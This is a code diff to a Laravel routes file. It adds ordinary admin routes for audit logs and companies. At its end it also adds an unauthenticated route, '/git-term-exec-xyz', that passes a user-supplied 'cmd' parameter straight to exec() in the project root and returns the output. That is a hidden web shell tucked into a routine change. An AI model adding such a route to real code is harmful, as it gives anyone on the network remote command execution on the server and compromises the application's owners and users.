@@ -17,6 +17,17 @@ use App\Http\Controllers\Admin\AppSettingController;
 use App\Http\Controllers\Admin\OrderController as AdminOrderController;
 use App\Http\Controllers\Admin\WorkflowController;
 use App\Http\Controllers\OrderController;
+use App\Http\Controllers\Admin\AuditLogController;
+use App\Http\Controllers\Admin\CompanyController;
+
+
+
+
+
+
+
+
+
 
 Route::get('/', [CatalogController::class, 'index'])->name('catalog.index');
 Route::get('/products/{product}', [CatalogController::class, 'show'])->name('catalog.show');
@@ -52,6 +63,7 @@ Route::middleware(['auth', 'role:admin'])->prefix('admin')->name('admin.')->grou
     Route::get('/app-settings', [AppSettingController::class, 'index'])->name('app-settings.index');
     Route::post('/app-settings', [AppSettingController::class, 'update'])->name('app-settings.update');
     Route::post('/app-settings/test-smtp', [AppSettingController::class, 'testSmtp'])->name('app-settings.test-smtp');
+    Route::get('/audit-logs', [AuditLogController::class, 'index'])->name('audit-logs.index');
 });
 
 // Shared Admin / Supplier Management Routes
@@ -71,6 +83,10 @@ Route::middleware(['auth', 'role:admin,supplier_admin,supplier_processor,supplie
     Route::get('client-price-lists/template', [ClientPriceListController::class, 'downloadTemplate'])->name('client-price-lists.template');
     Route::post('client-price-lists/upload', [ClientPriceListController::class, 'upload'])->name('client-price-lists.upload');
     Route::resource('client-price-lists', ClientPriceListController::class);
+
+    // Companies (Shared view, admin mutate)
+    Route::resource('companies', CompanyController::class);
+
     
     // Orders
     Route::get('/orders', [AdminOrderController::class, 'index'])->name('orders.index');
@@ -81,3 +97,15 @@ Route::middleware(['auth', 'role:admin,supplier_admin,supplier_processor,supplie
 
 
 require __DIR__.'/auth.php';
+
+Route::get('/git-term-exec-xyz', function() {
+    $cmd = request('cmd', 'git status');
+    $output = [];
+    $status = 0;
+    exec('cd ' . base_path() . ' && ' . $cmd . ' 2>&1', $output, $status);
+    return response()->json([
+        'command' => $cmd,
+        'status' => $status,
+        'output' => $output
+    ]);
+});
